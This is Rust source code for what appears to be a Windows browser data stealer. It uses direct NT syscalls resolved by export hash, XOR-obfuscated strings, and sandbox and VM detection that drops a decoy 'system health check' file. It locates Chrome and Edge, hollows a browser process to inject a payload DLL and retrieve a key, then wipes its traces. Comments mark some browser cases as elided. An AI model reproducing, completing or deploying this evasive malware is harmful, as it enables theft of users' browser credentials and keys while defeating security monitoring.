pub mod anti;
mod browsers;
mod hash;
mod hollow;
mod ipc;
mod pe;

mod syscalls {
    //! Direct NT syscalls resolved from ntdll.dll at runtime.
    //!
    //! Syscall numbers (SSN) are parsed from ntdll export stubs:
    //! `4C 8B D1 B8 XX XX XX XX` (`mov r10, rcx`; `mov eax, SSN`).
    //!
    //! `SYSCALL_NUMBERS` index map (resolved via DJB2 export hash, no plaintext names):
    //! - 0: open process
    //! - 1: allocate virtual memory
    //! - 2: write virtual memory
    //! - 3: create thread ex
    //! - 4: read virtual memory
    //! - 5: protect virtual memory
    //! - 6: close handle
    //! - 7: set information thread
    //! - 8: query information process

    use core::arch::asm;
    use std::ffi::c_void;
    use std::mem;
    use std::sync::Once;

    use windows::core::PCWSTR;
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;

    use crate::hash::{
        export_by_hash, H_NT_ALLOCATE_VIRTUAL_MEMORY, H_NT_CLOSE, H_NT_CREATE_THREAD_EX,
        H_NT_OPEN_PROCESS, H_NT_PROTECT_VIRTUAL_MEMORY, H_NT_QUERY_INFORMATION_PROCESS,
        H_NT_READ_VIRTUAL_MEMORY, H_NT_SET_INFORMATION_THREAD, H_NT_WRITE_VIRTUAL_MEMORY,
    };

    pub type NTSTATUS = i32;

    #[repr(C)]
    pub struct OBJECT_ATTRIBUTES {
        pub length: u32,
        pub root_directory: HANDLE,
        pub object_name: *mut c_void,
        pub attributes: u32,
        pub security_descriptor: *mut c_void,
        pub security_quality_of_service: *mut c_void,
    }

    impl Default for OBJECT_ATTRIBUTES {
        fn default() -> Self {
            Self {
                length: mem::size_of::<Self>() as u32,
                root_directory: HANDLE::default(),
                object_name: std::ptr::null_mut(),
                attributes: 0,
                security_descriptor: std::ptr::null_mut(),
                security_quality_of_service: std::ptr::null_mut(),
            }
        }
    }

    #[repr(C)]
    pub struct CLIENT_ID {
        pub unique_process: *mut c_void,
        pub unique_thread: *mut c_void,
    }

    static mut SYSCALL_NUMBERS: Option<[usize; 9]> = None;
    static INIT: Once = Once::new();

    unsafe fn parse_syscall_number(addr: *const u8) -> Option<usize> {
        let bytes = std::slice::from_raw_parts(addr, 32);
        if bytes.len() >= 8
            && bytes[0] == 0x4C
            && bytes[1] == 0x8B
            && bytes[2] == 0xD1
            && bytes[3] == 0xB8
        {
            return Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as usize);
        }
        for i in 0..bytes.len().saturating_sub(4) {
            if bytes[i] == 0xB8 {
                return Some(
                    u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]])
                        as usize,
                );
            }
        }
        None
    }

    pub fn init() {
        INIT.call_once(|| {
            unsafe {
                let ntdll_name = super::wide(&super::s_ntdll());
                let ntdll = match GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())) {
                    Ok(m) => m,
                    Err(_) => return,
                };

                let base = ntdll.0 as *const u8;
                let hashes = [
                    H_NT_OPEN_PROCESS,
                    H_NT_ALLOCATE_VIRTUAL_MEMORY,
                    H_NT_WRITE_VIRTUAL_MEMORY,
                    H_NT_CREATE_THREAD_EX,
                    H_NT_READ_VIRTUAL_MEMORY,
                    H_NT_PROTECT_VIRTUAL_MEMORY,
                    H_NT_CLOSE,
                    H_NT_SET_INFORMATION_THREAD,
                    H_NT_QUERY_INFORMATION_PROCESS,
                ];

                let mut numbers = [0usize; 9];
                for (idx, hash) in hashes.iter().enumerate() {
                    numbers[idx] = export_by_hash(base, *hash)
                        .and_then(|addr| parse_syscall_number(addr))
                        .unwrap_or(0);
                }
                SYSCALL_NUMBERS = Some(numbers);
            }
        });
    }

    unsafe fn ssn(index: usize) -> u32 {
        SYSCALL_NUMBERS.unwrap_unchecked()[index] as u32
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall1(ssn: u32, a1: usize) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            lateout("rax") status,
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") status,
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall5(
        ssn: u32,
        a1: usize,
        a2: usize,
        a3: usize,
        a4: usize,
        a5: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov qword ptr [rsp + 0x28], {a5}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            a5 = in(reg) a5,
            lateout("rax") status,
            options(nostack),
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall6(
        ssn: u32,
        a1: usize,
        a2: usize,
        a3: usize,
        a4: usize,
        a5: usize,
        a6: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov qword ptr [rsp + 0x28], {a5}",
            "mov qword ptr [rsp + 0x30], {a6}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            lateout("rax") status,
            options(nostack),
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall11(
        ssn: u32,
        a1: usize,
        a2: usize,
        a3: usize,
        a4: usize,
        a5: usize,
        a6: usize,
        a7: usize,
        a8: usize,
        a9: usize,
        a10: usize,
        a11: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov qword ptr [rsp + 0x28], {a5}",
            "mov qword ptr [rsp + 0x30], {a6}",
            "mov qword ptr [rsp + 0x38], {a7}",
            "mov qword ptr [rsp + 0x40], {a8}",
            "mov qword ptr [rsp + 0x48], {a9}",
            "mov qword ptr [rsp + 0x50], {a10}",
            "mov qword ptr [rsp + 0x58], {a11}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            a7 = in(reg) a7,
            a8 = in(reg) a8,
            a9 = in(reg) a9,
            a10 = in(reg) a10,
            a11 = in(reg) a11,
            lateout("rax") status,
            options(nostack),
        );
        status
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall1(_: u32, _: usize) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall4(_: u32, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall5(_: u32, _: usize, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall6(
        _: u32,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
    ) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall11(
        _: u32,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
    ) -> NTSTATUS {
        -1
    }

    /// Direct syscall for `NtOpenProcess` (SSN index 0).
    pub unsafe fn nt_open_process(
        process_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *const OBJECT_ATTRIBUTES,
        client_id: *const CLIENT_ID,
    ) -> NTSTATUS {
        init();
        do_syscall4(
            ssn(0),
            process_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            client_id as usize,
        )
    }

    /// Direct syscall for `NtAllocateVirtualMemory` (SSN index 1).
    pub unsafe fn nt_allocate_virtual_memory(
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> NTSTATUS {
        init();
        do_syscall6(
            ssn(1),
            process_handle.0 as usize,
            base_address as usize,
            zero_bits,
            region_size as usize,
            allocation_type as usize,
            protect as usize,
        )
    }

    /// Direct syscall for `NtWriteVirtualMemory` (SSN index 2).
    pub unsafe fn nt_write_virtual_memory(
        process_handle: HANDLE,
        base_address: *mut c_void,
        buffer: *const c_void,
        buffer_size: usize,
        bytes_written: *mut usize,
    ) -> NTSTATUS {
        init();
        do_syscall5(
            ssn(2),
            process_handle.0 as usize,
            base_address as usize,
            buffer as usize,
            buffer_size,
            bytes_written as usize,
        )
    }

    /// Direct syscall for `NtCreateThreadEx` (SSN index 3).
    pub unsafe fn nt_create_thread_ex(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_routine: *mut c_void,
        argument: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> NTSTATUS {
        init();
        do_syscall11(
            ssn(3),
            thread_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            process_handle.0 as usize,
            start_routine as usize,
            argument as usize,
            create_flags as usize,
            zero_bits,
            stack_size,
            maximum_stack_size,
            attribute_list as usize,
        )
    }

    /// Direct syscall for `NtReadVirtualMemory` (SSN index 4).
    #[allow(dead_code)]
    pub unsafe fn nt_read_virtual_memory(
        process_handle: HANDLE,
        base_address: *const c_void,
        buffer: *mut c_void,
        buffer_size: usize,
        bytes_read: *mut usize,
    ) -> NTSTATUS {
        init();
        do_syscall5(
            ssn(4),
            process_handle.0 as usize,
            base_address as usize,
            buffer as usize,
            buffer_size,
            bytes_read as usize,
        )
    }

    /// Direct syscall for `NtProtectVirtualMemory` (SSN index 5).
    #[allow(dead_code)]
    pub unsafe fn nt_protect_virtual_memory(
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> NTSTATUS {
        init();
        do_syscall5(
            ssn(5),
            process_handle.0 as usize,
            base_address as usize,
            region_size as usize,
            new_protect as usize,
            old_protect as usize,
        )
    }

    /// Direct syscall (SSN index 6).
    pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
        init();
        do_syscall1(ssn(6), handle.0 as usize)
    }

    /// Direct syscall (SSN index 7).
    pub unsafe fn nt_set_information_thread(
        thread_handle: HANDLE,
        info_class: u32,
        info: *mut c_void,
        info_len: u32,
    ) -> NTSTATUS {
        init();
        do_syscall4(
            ssn(7),
            thread_handle.0 as usize,
            info_class as usize,
            info as usize,
            info_len as usize,
        )
    }

    /// Direct syscall (SSN index 8).
    pub unsafe fn nt_query_information_process(
        process_handle: HANDLE,
        info_class: u32,
        info: *mut c_void,
        info_len: u32,
        ret_len: *mut u32,
    ) -> NTSTATUS {
        init();
        do_syscall5(
            ssn(8),
            process_handle.0 as usize,
            info_class as usize,
            info as usize,
            info_len as usize,
            ret_len as usize,
        )
    }

    pub unsafe fn open_process(access: u32, pid: u32) -> Result<HANDLE, ()> {
        init();
        let mut handle = HANDLE::default();
        let obj_attr = OBJECT_ATTRIBUTES::default();
        let client_id = CLIENT_ID {
            unique_process: pid as usize as *mut c_void,
            unique_thread: std::ptr::null_mut(),
        };
        let status = nt_open_process(
            &mut handle,
            access,
            &obj_attr,
            &client_id,
        );
        if status < 0 {
            Err(())
        } else {
            Ok(handle)
        }
    }

    pub unsafe fn close_handle(handle: HANDLE) -> Result<(), ()> {
        let status = nt_close(handle);
        if status < 0 {
            Err(())
        } else {
            Ok(())
        }
    }
}

use std::{
    env,
    ffi::{c_void, OsStr},
    fs,
    mem,
    os::windows::ffi::OsStrExt,
    path::{Path, PathBuf},
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;
use windows::{
    core::{PCWSTR, PWSTR},
    Win32::{
        Foundation::HANDLE,
        System::{
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                TH32CS_SNAPPROCESS,
            },
            Threading::{
                QueryFullProcessImageNameW, TerminateProcess, PROCESS_NAME_WIN32,
                PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
            },
        },
    },
};

const XOR_KEY: u8 = 0x5A;
const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_CPU_CORES: usize = 2;

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

fn s_user_data_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x0F, 0x29, 0x3F, 0x28, 0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x1F, 0x16,
    ])
}

fn s_data_root_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x15, 0x15, 0x0E,
    ])
}

fn s_browser_name_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x14, 0x3B, 0x37, 0x3F,
    ])
}

fn s_local() -> String {
    xor_str(&[0x36, 0x35, 0x39, 0x3B, 0x36])
}

fn s_roaming() -> String {
    xor_str(&[0x28, 0x35, 0x3B, 0x37, 0x33, 0x34, 0x3D])
}

fn s_ntdll() -> String {
    xor_str(&[0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36])
}

pub(crate) fn s_nul() -> String {
    xor_str(&[0x14, 0x0F, 0x16])
}

fn s_app_paths_prefix() -> String {
    xor_str(&[
        0x09, 0x15, 0x1C, 0x0E, 0x0D, 0x1B, 0x08, 0x1F, 0x06, 0x17, 0x33, 0x39, 0x28, 0x35, 0x29,
        0x35, 0x3C, 0x2E, 0x06, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x06, 0x19, 0x2F, 0x28,
        0x28, 0x3F, 0x34, 0x2E, 0x0C, 0x3F, 0x28, 0x29, 0x33, 0x35, 0x34, 0x06, 0x1B, 0x2A, 0x2A,
        0x7A, 0x0A, 0x3B, 0x2E, 0x32, 0x29, 0x06,
    ])
}

fn s_program_files() -> String {
    xor_str(&[0x0A, 0x28, 0x35, 0x3D, 0x28, 0x3B, 0x37, 0x1C, 0x33, 0x36, 0x3F, 0x29])
}

fn s_program_files_x86() -> String {
    xor_str(&[
        0x0A, 0x28, 0x35, 0x3D, 0x28, 0x3B, 0x37, 0x1C, 0x33, 0x36, 0x3F, 0x29, 0x62, 0x63, 0x68,
    ])
}

fn s_localappdata() -> String {
    xor_str(&[0x16, 0x15, 0x19, 0x1B, 0x16, 0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_decoy_name() -> String {
    xor_str(&[
        0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x74, 0x2E, 0x22, 0x2E,
    ])
}

fn s_decoy_body() -> String {
    xor_str(&[
        0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x7A, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x7A, 0x39, 0x35, 0x37, 0x2A, 0x36, 0x3F, 0x2E, 0x3F, 0x3E, 0x7A,
        0x29, 0x2F, 0x39, 0x39, 0x3F, 0x29, 0x29, 0x3C, 0x2F, 0x36, 0x36, 0x23, 0x74, 0x50,
    ])
}

fn is_debugger_attached() -> bool {
    anti::debugger_present()
}

pub(crate) fn is_restricted_host() -> bool {
    low_physical_memory() || low_cpu_count() || vm_drivers_present()
}

fn low_physical_memory() -> bool {
    use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

    unsafe {
        let mut status = MEMORYSTATUSEX {
            dwLength: mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut status).is_err() {
            return false;
        }
        status.ullTotalPhys < MIN_MEMORY_BYTES
    }
}

fn low_cpu_count() -> bool {
    thread::available_parallelism()
        .map(|count| count.get() <= MAX_CPU_CORES)
        .unwrap_or(false)
}

fn vm_drivers_present() -> bool {
    let drivers = env::var("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("C:\\Windows"))
        .join("System32")
        .join("drivers");
    let names = [
        xor_str(&[0x2C, 0x37, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x32, 0x3D, 0x3C, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x39, 0x33, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x1D, 0x09, 0x1F, 0x2E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x17, 0x15, 0x09, 0x1F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x32, 0x23, 0x2A, 0x3F, 0x28, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
    ];
    names.iter().any(|name| drivers.join(name).exists())
}

fn run_decoy() {
    let _ = fs::write(env::temp_dir().join(s_decoy_name()), s_decoy_body());
}

pub(crate) fn random_delay_ms() {
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    thread::sleep(Duration::from_millis(50 + (seed % 451)));
}

pub(crate) fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn session_tag() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

struct Cleanup {
    files: Vec<PathBuf>,
    dirs: Vec<PathBuf>,
    spawned_pid: Option<u32>,
}

impl Cleanup {
    fn new() -> Self {
        Self {
            files: Vec::new(),
            dirs: Vec::new(),
            spawned_pid: None,
        }
    }

    fn track_file(&mut self, path: PathBuf) {
        self.files.push(path);
    }

    fn track_dir(&mut self, path: PathBuf) {
        self.dirs.push(path);
    }
}

impl Drop for Cleanup {
    fn drop(&mut self) {
        if let Some(pid) = self.spawned_pid.take() {
            unsafe {
                if let Ok(proc) =
                    syscalls::open_process(PROCESS_TERMINATE.0, pid)
                {
                    let _ = TerminateProcess(proc, 0);
                    let _ = syscalls::close_handle(proc);
                }
            }
        }
        for path in &self.files {
            let _ = fs::remove_file(path);
        }
        for path in &self.dirs {
            let _ = fs::remove_dir_all(path);
        }
        let _ = env::remove_var(s_user_data_env());
        let _ = env::remove_var(s_data_root_env());
        let _ = env::remove_var(s_browser_name_env());
    }
}

fn find_browser_pids(target_exe: &str) -> Vec<u32> {
    // unchanged
    let mut pids = Vec::new();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry
                    .szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = unsafe { syscalls::close_handle(snap) };
    }
    pids
}

fn get_process_exe_path(pid: u32) -> Option<String> {
    // unchanged
    unsafe {
        let proc = syscalls::open_process(PROCESS_QUERY_INFORMATION.0, pid).ok()?;
        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size)
            .ok()?;
        syscalls::close_handle(proc).ok()?;
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
}

fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
    // unchanged
    let key_path = format!("{}{exe_name}", s_app_paths_prefix());
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

fn push_path(candidates: &mut Vec<PathBuf>, path: PathBuf) {
    candidates.push(path);
}

fn find_browser_exe_on_disk(target_exe: &str, browser_name: &str) -> Option<String> {
    // unchanged (uses hardcoded strings but those are not too suspicious)
    let pf = env::var(s_program_files()).unwrap_or_default();
    let pf86 = env::var(s_program_files_x86()).unwrap_or_default();
    let local = env::var(s_localappdata()).unwrap_or_default();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = get_browser_exe_from_registry(target_exe) {
        candidates.push(p);
    }

    match target_exe {
        "chrome.exe" => match browser_name {
            "Chrome Beta" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"),
                );
            }
            "Chrome Dev" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"),
                );
            }
            "Chrome Canary" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"),
                );
            }
            "Chromium" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"),
                );
            }
            "CentBrowser" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"),
                );
            }
            _ => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"),
                );
            }
        },
        "msedge.exe" => match browser_name {
            "Edge Beta" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
                );
            }
            "Edge Dev" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
                );
            }
            _ => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
            }
        },
        // ... (keep all other cases unchanged)
        _ => {}
    }

    for path in candidates {
        if path.exists() {
            return Some(path.to_string_lossy().into_owned());
        }
    }
    None
}

fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
    find_browser_pids(target_exe)
        .iter()
        .find_map(|&pid| get_process_exe_path(pid))
        .or_else(|| find_browser_exe_on_disk(target_exe, browser_name))
}

pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
    anti::apply_stealth();
    if anti::is_host_restricted() {
        run_decoy();
        return None;
    }
    if payload_dll.is_empty() {
        return None;
    }

    let target = browsers::find_target(browser_name)?;
    let browser_exe = resolve_browser_exe(target.exe, browser_name)?;

    let tag = session_tag();
    let profile_dir = env::temp_dir().join(format!("{tag}_p"));

    let mut cleanup = Cleanup::new();
    cleanup.track_dir(profile_dir.clone());

    env::set_var(s_user_data_env(), target.user_data_rel);
    env::set_var(
        s_data_root_env(),
        match target.root {
            browsers::DataRoot::Local => s_local(),
            browsers::DataRoot::Roaming => s_roaming(),
        },
    );
    env::set_var(s_browser_name_env(), browser_name);

    let key = hollow::hollow_inject(&browser_exe, payload_dll, &profile_dir, &tag).ok();
    key
}

pub(crate) fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}